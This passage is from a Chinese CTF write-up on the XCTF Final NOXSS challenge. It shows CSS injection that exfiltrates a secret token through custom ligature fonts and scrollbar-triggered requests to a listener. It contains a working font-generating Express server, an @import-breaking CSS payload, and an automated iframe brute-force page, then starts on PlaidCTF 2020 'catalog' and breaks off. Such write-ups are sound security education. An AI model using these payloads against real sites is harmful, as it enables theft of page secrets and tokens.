+            <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">http://127.0.0.1:8888</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">span</span><span class="p">&gt;</span>0807hack<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>如果直接访问上述页面的话，宽度不够不会出现滚动条。所以需要通过另一个页面通过iframe标签引入</p>
+<p>iframe.html</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"ie=edge"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://127.0.0.1/noxss/test.html"</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">"0"</span> <span class="na">width</span><span class="o">=</span><span class="s">"100px"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>本地监听8888端口然后浏览器访问iframe.html页面</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210322191623-0910d976-8b00-1.png"/></p>
+<p>可以看到成功发出请求到8888端口</p>
+<h3 data-content="1" id="8fb24c1ee23e94487e21b1220d64c815">爆破token2</h3>
+<p>根据上面的demo我们可以知道宽度足够大的连字可以发出请求，那么我们便可以利用类似35c3的方法来爆破得到token2，将我们猜测的字符串设置为连字，宽度很大，可以设置为100000，保证宽度溢出出现滚动条，且格式为<code>xctf{*.}</code>而其余可见字符宽度设置为0。通过控制css设置<code>&lt;script&gt;</code>标签中的字体为上述我们设置的字体，如果出现了我们猜测的连字，则会加载连字，出现滚动条进而发出请求。如果未出现，则全部按宽度为0加载，不会出现滚动条。以上是大致的思路，为实现自动化，我们需要准备如下：</p>
+<p><strong>1.部署一个生成.woff文件的服务器，根据路由参数(猜测的字符)来生成并发送.woff文件</strong></p>
+<p>这里直接使用那位波兰作者的代码，用nodejs起的一个服务</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+<span class="c1">// Serwer ExprssJS domyślnie dodaje nagłówek ETag,</span>
+<span class="c1">// ale nam nie jest to potrzebne, więc wyłączamy.</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">disable</span><span class="p">(</span><span class="s1">'etag'</span><span class="p">);</span>
+
+<span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span>
+<span class="kr">const</span> <span class="nx">js2xmlparser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'js2xmlparser'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'fs'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'tmp'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">rimraf</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'rimraf'</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">child_process</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">);</span>
+
+
+<span class="c1">// Generujemy fonta dla zadanego przedrostka</span>
+<span class="c1">// i znaków, dla których ma zostać utworzona ligatura.</span>
+<span class="kd">function</span> <span class="nx">createFont</span><span class="p">(</span><span class="nx">prefix</span><span class="p">,</span> <span class="nx">charsToLigature</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">font</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">"defs"</span><span class="o">:</span> <span class="p">{</span>
+            <span class="s2">"font"</span><span class="o">:</span> <span class="p">{</span>
+                <span class="s2">"@"</span><span class="o">:</span> <span class="p">{</span>
+                    <span class="s2">"id"</span><span class="o">:</span> <span class="s2">"hack"</span><span class="p">,</span>
+                    <span class="s2">"horiz-adv-x"</span><span class="o">:</span> <span class="s2">"0"</span>
+                <span class="p">},</span>
+                <span class="s2">"font-face"</span><span class="o">:</span> <span class="p">{</span>
+                    <span class="s2">"@"</span><span class="o">:</span> <span class="p">{</span>
+                        <span class="s2">"font-family"</span><span class="o">:</span> <span class="s2">"hack"</span><span class="p">,</span>
+                        <span class="s2">"units-per-em"</span><span class="o">:</span> <span class="s2">"1000"</span>
+                    <span class="p">}</span>
+                <span class="p">},</span>
+                <span class="s2">"glyph"</span><span class="o">:</span> <span class="p">[]</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+
+    <span class="c1">// 将0x20-0x7e的可见字符生成宽度为0的字体</span>
+    <span class="kd">let</span> <span class="nx">glyphs</span> <span class="o">=</span> <span class="nx">font</span><span class="p">.</span><span class="nx">defs</span><span class="p">.</span><span class="nx">font</span><span class="p">.</span><span class="nx">glyph</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;=</span> <span class="mh">0x7e</span><span class="p">;</span> <span class="nx">c</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="nx">glyph</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">"@"</span><span class="o">:</span> <span class="p">{</span>
+                <span class="s2">"unicode"</span><span class="o">:</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">c</span><span class="p">),</span>
+                <span class="s2">"horiz-adv-x"</span><span class="o">:</span> <span class="s2">"0"</span><span class="p">,</span>
+                <span class="s2">"d"</span><span class="o">:</span> <span class="s2">"M1 0z"</span><span class="p">,</span>
+            <span class="p">}</span>
+        <span class="p">};</span>
+        <span class="nx">glyphs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">glyph</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// 生成连字</span>
+    <span class="nx">charsToLigature</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">c</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="nx">glyph</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">"@"</span><span class="o">:</span> <span class="p">{</span>
+                <span class="s2">"unicode"</span><span class="o">:</span> <span class="nx">prefix</span> <span class="o">+</span> <span class="nx">c</span><span class="p">,</span>
+                <span class="s2">"horiz-adv-x"</span><span class="o">:</span> <span class="s2">"10000"</span><span class="p">,</span>
+                <span class="s2">"d"</span><span class="o">:</span> <span class="s2">"M1 0z"</span><span class="p">,</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nx">glyphs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">glyph</span><span class="p">);</span>
+    <span class="p">});</span>
+
+    <span class="c1">// 利用xml解析为.svg文件</span>
+    <span class="kr">const</span> <span class="nx">xml</span> <span class="o">=</span> <span class="nx">js2xmlparser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s2">"svg"</span><span class="p">,</span> <span class="nx">font</span><span class="p">);</span>
+
+    <span class="c1">// A następnie wykorzystujemy fontforge</span>
+    <span class="c1">// do zamiany SVG na WOFF.</span>
+    <span class="kr">const</span> <span class="nx">tmpobj</span> <span class="o">=</span> <span class="nx">tmp</span><span class="p">.</span><span class="nx">dirSync</span><span class="p">();</span>
+    <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">tmpobj</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">/font.svg`</span><span class="p">,</span> <span class="nx">xml</span><span class="p">);</span>
+    <span class="nx">child_process</span><span class="p">.</span><span class="nx">spawnSync</span><span class="p">(</span><span class="s2">"/usr/bin/fontforge"</span><span class="p">,</span> <span class="p">[</span>
+        <span class="sb">`</span><span class="si">${</span><span class="nx">__dirname</span><span class="si">}</span><span class="sb">/script.fontforge`</span><span class="p">,</span>
+        <span class="sb">`</span><span class="si">${</span><span class="nx">tmpobj</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">/font.svg`</span>
+    <span class="p">]);</span>
+
+    <span class="kr">const</span> <span class="nx">woff</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">tmpobj</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">/font.woff`</span><span class="p">);</span>
+
+    <span class="c1">// Usuwamy katalog tymczasowy.</span>
+    <span class="nx">rimraf</span><span class="p">.</span><span class="nx">sync</span><span class="p">(</span><span class="nx">tmpobj</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
+
+    <span class="c1">// I zwracamy fonta w postaci WOFF.</span>
+    <span class="k">return</span> <span class="nx">woff</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Endpoint do generowania fontów.</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/font/:prefix/:charsToLigature"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kr">const</span> <span class="p">{</span> <span class="nx">prefix</span><span class="p">,</span> <span class="nx">charsToLigature</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">;</span>
+
+    <span class="c1">// Dbamy o to by font znalazł się w cache'u.</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">set</span><span class="p">({</span>
+        <span class="s1">'Cache-Control'</span><span class="o">:</span> <span class="s1">'public, max-age=600'</span><span class="p">,</span>
+        <span class="s1">'Content-Type'</span><span class="o">:</span> <span class="s1">'application/font-woff'</span><span class="p">,</span>
+        <span class="s1">'Access-Control-Allow-Origin'</span><span class="o">:</span> <span class="s1">'*'</span><span class="p">,</span>
+    <span class="p">});</span>
+
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">createFont</span><span class="p">(</span><span class="nx">prefix</span><span class="p">,</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">charsToLigature</span><span class="p">)));</span>
+
+<span class="p">});</span>
+
+<span class="c1">// Endpoint do przyjmowania znaków przez połączenie zwrotne</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/reverse/:chars"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">'chars'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">chars</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">'Set-Cookie'</span><span class="p">,</span> <span class="sb">`chars=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">chars</span><span class="p">)</span><span class="si">}</span><span class="sb">; Path=/`</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/cookie.js'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="s1">'js.cookie.js'</span><span class="p">,</span> <span class="p">{</span>
+        <span class="nx">root</span><span class="o">:</span> <span class="s1">'./node_modules/js-cookie/src/'</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/index.html'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">,</span> <span class="p">{</span>
+        <span class="nx">root</span><span class="o">:</span> <span class="s1">'.'</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Listening on </span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">...`</span><span class="p">);</span>
+<span class="p">})</span>
+</pre></div>
+<p>这里只需用到/font的路由来生成并获取.woff文件。</p>
+<p><strong>2.调用服务API并接收字体用于爆破的页面test.html，设置css逐位爆破</strong></p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"ie=edge"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="kd">var</span> <span class="nx">token2</span> <span class="o">=</span> <span class="s2">"xctf{diggid}"</span><span class="p">;</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+        <span class="p">@</span><span class="k">font-face</span> <span class="p">{</span>
+            <span class="nt">font-family</span><span class="o">:</span> <span class="s2">"hack"</span><span class="o">;</span>
+            <span class="nt">src</span><span class="o">:</span> <span class="nt">url</span><span class="o">(</span><span class="nt">http</span><span class="o">://</span><span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">170</span><span class="p">.</span><span class="nc">129</span><span class="p">:</span><span class="nd">9999</span><span class="o">/</span><span class="nt">font</span><span class="o">/</span><span class="nt">xctf</span><span class="o">%</span><span class="nt">7b</span><span class="o">/</span><span class="nt">d</span><span class="o">);</span>
+        <span class="p">}</span>
+        <span class="nt">script</span> <span class="p">{</span>
+            <span class="k">display</span><span class="p">:</span> <span class="kc">table</span><span class="p">;</span>
+            <span class="k">font-family</span><span class="p">:</span> <span class="s2">"hack"</span><span class="p">;</span>
+            <span class="k">white-space</span><span class="p">:</span> <span class="kc">nowrap</span><span class="p">;</span>
+            <span class="k">background</span><span class="p">:</span> <span class="kc">lightblue</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">body</span><span class="p">::</span><span class="nd">-webkit-scrollbar</span> <span class="p">{</span>
+            <span class="k">background</span><span class="p">:</span> <span class="kc">blue</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nt">body</span><span class="p">::</span><span class="nd">-webkit-scrollbar</span><span class="p">:</span><span class="nd">horizontal</span> <span class="p">{</span>
+            <span class="k">display</span><span class="p">:</span> <span class="kc">block</span><span class="p">;</span>
+            <span class="k">background</span><span class="p">:</span> <span class="kc">blue</span> <span class="nb">url</span><span class="p">(</span><span class="sx">http://127.0.0.1:8888</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>在demo的场景中，由于css是可控的，因此我们在<code>&lt;style&gt;</code>标签中插入相应的css内容：将script标签显示<code>display: table</code>，并将script标签的字体设置为从服务器接收的字体，禁止空白换行</p>
+<p><strong>3.通过iframe标签引入test.html触发滚动条发送请求外带数据</strong></p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"ie=edge"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://127.0.0.1/test.html"</span> <span class="na">style</span><span class="o">=</span><span class="s">"width:500px"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>但是上述过程仍不能实现自动化爆破，因此我们还需改造一下test.html实现逐位爆破，但在实际的利用过程中，由于<code>&lt;script&gt;</code>标签解析顺序、字体缓存等问题可能会导致利用失败，在不恰当的情况下发送请求。因此我们需要改进一下触发请求的方式。</p>
+<p>这里参考zsx师傅的做法：<a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank">https://xz.aliyun.com/t/6655#toc-5</a></p>
+<p><strong>具体的思路如下:</strong></p>
+<p>1.先将ifame页面宽度设置为很大(100000px)，保证提前不会出现滚动条(由于iframe标签加载资源时<code>&lt;script&gt;</code>标签内容先解析可能会先出现滚动条并触发请求，然后才解析完字体，因此顺序不当)</p>
+<p>2.隐藏页面中的所有元素，仅显示script标签的元素</p>
+<p>3.iframe加载资源完成后，触发onload事件，将iframe页面宽度再缩小为10px，即可让连字宽度溢出稳定触发滚动条</p>
+<p>上述过程保证了宽度溢出是连字导致的而非script标签其他内容导致的。</p>
+<h2 data-content="1" id="f43802d740c64ec71ee1de90d5165126">回到原题</h2>
+<p>基本上利用思路和token2完全相同，但是我们需要先绕过题目限制，注入css代码。</p>
+<p>题目中输入theme参数拼接在css样式的@import语句中</p>
+<pre><code>@import url("/static/css/${css}/bootstrap.min.css");</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210322191623-095f5984-8b00-1.png"/></p>
+<p><strong>绕过import</strong></p>
+<p>根据css文档，css中的换行方式如下：%0a %0d %0f</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210322191624-0992dda4-8b00-1.png"/></p>
+<p>并且css的错误兼容性强，也就是说，对于一些错误的语法，css会忽略。因此我们需要利用换行来使整个import变成错误无效的语句，从而注入我们的css代码，因此我们通过以下形式可以使import失效并注入css代码</p>
+<pre><code>%0a){}/*在此注入*/</code></pre>
+<p>对于上述payload的理解：%0a换行导致import语句失效，猜测<code>(</code>未解析完毕，需要<code>)</code>要闭合，然后再注入<code>{}</code>空样式来使得css语法解析正常，之后即可任意注入css代码</p>
+<p>可以任意注入css代码后，我们便可像上面所述思路构造自动化的爆破页面，这里每次访问只能得到一位的flag，因为发送URL这一状态(即爆破成功的状态)不容易获取，所以这里不考虑一次性爆破整个flag的脚本。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"ie=edge"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="kr">const</span> <span class="nx">charset</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">''</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">prefix</span> <span class="o">=</span> <span class="s2">"xctf{"</span><span class="p">;</span>
+        <span class="nx">charset</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">c</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">css</span> <span class="o">=</span> <span class="s1">'?theme=\n){}'</span>
+            <span class="nx">css</span> <span class="o">+=</span> <span class="sb">`body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://127.0.0.1:8888/?</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">prefix</span><span class="o">+</span><span class="nx">c</span><span class="p">)</span><span class="si">}</span><span class="sb">)}`</span>
+            <span class="nx">css</span> <span class="o">+=</span> <span class="sb">`@font-face{font-family:a</span><span class="si">${</span><span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">()</span><span class="si">}</span><span class="sb">;src:url(http://127.0.0.1:9999/font/</span><span class="si">${</span><span class="nx">prefix</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">c</span><span class="si">}</span><span class="sb">);}`</span>
+            <span class="nx">css</span> <span class="o">+=</span> <span class="sb">`script{font-family:a</span><span class="si">${</span><span class="nx">c</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">()</span><span class="si">}</span><span class="sb">;display:block}`</span> 
+            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="sb">`&lt;iframe scrolling=yes samesite src="http://127.0.0.1:60000/account/userinfo?theme=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">css</span><span class="p">)</span><span class="si">}</span><span class="sb">" style="width:1000000px" onload="event.target.style.width='100px'"&gt;&lt;/iframe&gt;`</span><span class="p">);</span>
+        <span class="p">});</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>由于没有题目环境，自己用node.js搭建了一个类似的环境，和demo差不多。然后逐位爆破的结果如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210322191625-0a525e4a-8b00-1.png"/></p>
+<p><strong>参考</strong></p>
+<p><a href="https://xz.aliyun.com/t/6812?page=1#toc-5" target="_blank">XCTF Final NOXSS 攻击技术详细分析</a></p>
+<p><a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank">XCTF final 2019 Writeup By ROIS</a></p>
+<p><a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/" target="_blank">Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a></p>
+<p><a href="https://www.smi1e.top/%E9%80%9A%E8%BF%87css%E6%B3%A8%E5%85%A5%E7%AA%83%E5%8F%96html%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE/" target="_blank">通过css注入窃取html中的数据</a></p>
+<h1 data-content="1" id="a8f6ed025146f8a0d9654b64e076d659">PlaidCTF 2020 catalog</h1>
+<p>一题比一题虾仁猪心:)</p>
+<h2 data-content="1" id="a0bc5e47166c8c2a39a42362a738140f">题目介绍</h2>
+<p><a href="https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog/problem" target="_blank">题目的仓库</a> &amp; <a href="https://dttw.tech/posts/B19RXWzYL" target="_blank">官方wp</a></p>
+<h3 data-content="1" id="dbaee5eaf349a1cd1285a504b433e475">题目描述</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210322191625-0a90bffa-8b00-1.png"/></p>
+<p>题目给出了admin bot、flag所在页面和flag格式、四条hints。</p>
+<p>除此之外，题目是黑盒环境，有以下几项功能：</p>
+<ul>
+<li>
+<p>登录注册</p>
+</li>
+<li>
+<p>发表issue，admin可查看(明显要xss)</p>
+</li>
+</ul>
+<h3 data-content="1" id="5875feb462dca61a1f396b4ab0535ae3">注入点</h3>
+<p>通过观察和测试可以发现三个注入点，这几个注入点对后续外带flag比较关键</p>
+<ol>
+<li>
+<p>提交issue处输入image的url时存在html注入</p>
+</li>
+<li>
+<p>登录失败时，无过滤回显登录时输入的username，因此在username存在html注入</p>
+</li>
+<li>题目存在session，且session中存储html元素，若用已登录成功的session发送一个username错误</li>
+</ol>
+<h3 data-content="1" id="fa7cdf273b7b0cf00f31b505f1e08833">CSP限制</h3>
+<p>题目设置了如下CSP</p>
+<div class="highlight"><pre><span></span><span class="nx">Content</span><span class="o">-</span><span class="nx">Security</span><span class="o">-</span><span class="nx">Policy</span><span class="o">:</span> <span class="k">default</span><span class="o">-</span><span class="nx">src</span> <span class="s1">'nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88'</span><span class="p">;</span> <span class="nx">img</span><span class="o">-</span><span class="nx">src</span> <span class="o">*</span><span class="p">;</span> <span class="nx">font</span><span class="o">-</span><span class="nx">src</span> <span class="s1">'self'</span> <span class="nx">fonts</span><span class="p">.</span><span class="nx">gstatic</span><span class="p">.</span><span class="nx">com</span><span class="p">;</span> <span class="nx">frame</span><span class="o">-</span><span class="nx">src</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//www.google.com/recaptcha/</span>
+</pre></div>
+<h2 data-content="1" id="7d4df9539a62cac36f96943f6404c526">前置知识</h2>
+<p>要想完成这道题目，首先需要了解以下的技术和特性</p>
+<ul>
+<li>
